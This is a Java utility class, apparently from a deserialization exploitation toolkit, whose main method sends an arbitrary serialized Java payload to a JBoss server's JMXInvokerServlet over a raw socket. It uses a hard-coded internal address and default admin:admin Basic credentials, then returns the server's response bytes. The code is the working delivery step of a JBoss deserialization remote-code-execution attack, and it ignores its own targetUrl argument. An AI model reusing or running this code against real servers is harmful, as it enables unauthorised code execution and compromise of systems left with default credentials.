package serializeTools.Utils;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class HttpHelper2 {
	private static final HttpHelper2 instance = new HttpHelper2();

	public static HttpHelper2 getInstance() {
		return instance;
	}

	public HttpResponse getResponse(String targetUrl) throws Exception, IOException {
		CloseableHttpClient httpClient = HttpClients.createDefault();
		HttpGet httpGet = new HttpGet(targetUrl);
		HttpResponse response = httpClient.execute(httpGet);
		return response;
	}

	public byte[] getPayloadResponse(String targetUrl,byte[] Payload) throws IOException, ClassNotFoundException {
	    Socket socket = new Socket("192.168.200.201", Integer.parseInt("8080"));
	    String path = "/invoker/JMXInvokerServlet";
	    OutputStream data = socket.getOutputStream();
	    String text = "";
	    text = text + "POST " + path + " HTTP/1.0\r\nProxy-Connection: keep-alive\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n";
	    text = text + "Content-Length: " + Payload.length + "\r\n";
	    text = text + "Upgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36\r\n";
	    text = text + "Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue\r\n";
	    text = text + "\r\n";
	    byte[] b3 = new byte[text.getBytes().length + Payload.length];
	    System.arraycopy(text.getBytes(), 0, b3, 0, text.getBytes().length);
	    System.arraycopy(Payload, 0, b3, text.getBytes().length, Payload.length);
	    data.write(b3);
	    data.flush();
	    byte[] TempByte = new byte[5000000];

	    int ecx = 0;
	    int r;
	    while ((r = socket.getInputStream().read()) != -1)
	    {
	      TempByte[ecx] = ((byte)r);
	      ecx++;
	    }
	    int ClassStart = 0;
	    for (int i = 0; i < ecx; i++)
	    {
	      if ((TempByte[i] == 13) && (TempByte[(i + 1)] == 10) && (TempByte[(i + 2)] == 13) && (TempByte[(i + 3)] == 10))
	      {
	        System.out.println(i);
	        ClassStart = i;
	        break;
	      }
	    }

	    byte[] ClassByte = new byte[ecx - ClassStart - 4];
	    for (int i = 0; i < ClassByte.length; i++)
	    {
	      ClassByte[i] = TempByte[(i + ClassStart + 4)];
	    }
	    TempByte = null;
	    socket.close();

	    return ClassByte;
	}


	public final byte[] input2byte(InputStream inStream) throws IOException {
		ByteArrayOutputStream swapStream = new ByteArrayOutputStream();
		byte[] buff = new byte[100];
		int rc = 0;
		while ((rc = inStream.read(buff, 0, 100)) > 0) {
			swapStream.write(buff, 0, rc);
		}
		byte[] in2b = swapStream.toByteArray();
		return in2b;
	}
}
